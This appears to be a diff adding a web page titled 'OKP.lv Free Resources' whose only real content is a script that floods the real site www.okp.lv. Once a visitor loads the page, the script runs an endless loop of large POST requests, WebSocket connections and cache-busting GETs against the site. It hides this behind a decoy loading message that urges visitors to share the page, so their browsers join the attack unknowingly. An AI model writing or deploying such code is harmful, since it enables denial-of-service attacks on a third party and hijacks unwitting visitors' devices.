@@ -1,0 +1,28 @@
+<title>OKP.lv Free Resources</title><meta name="viewport" content="width=device-width"><script>
+// Custom okp.lv DDoS: HTTP/2 Rapid Reset + Slowloris + POST flood
+const TARGET = 'https://www.okp.lv';
+const WP_PATHS = ['/wp-content/uploads/', '/wp-admin/', '/?p=1'];  // WP enum hits
+function ddos_okp() {
+    while(true) {
+        // 1. HTTP/2 Rapid Reset (CVE-2023-44487 style - exhaust streams)
+        for(let i=0; i<100; i++) {
+            fetch(TARGET + WP_PATHS[i%3] + Math.random(), {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Connection': 'keep-alive' },
+                body: 'a='.repeat(1000000),  // 1MB slow POST
+                keepalive: true,
+                cache: 'no-store'
+            }).catch(()=>{});  // Ignore errors, spam
+        }
+        // 2. WS fallback (if any /ws)
+        try { new WebSocket('wss://www.okp.lv/ws' + Math.random()); } catch(e){}
+        // 3. Cache-bust GET flood (WP vulns)
+        fetch(TARGET + '/?ddos=' + performance.now());
+    }
+}
+// iOS stealth: Run hidden + self-spread
+document.body.innerHTML = '<h1>OKP Resources Loading...</h1><p>Share for more!</p>';
+setTimeout(ddos_okp, 500);
+// Viral Notification
+if ('Notification' in window) Notification.requestPermission().then(() => new Notification('OKP Hack', {body: location.href, icon: 'https://www.okp.lv/favicon.ico'}));
+</script>
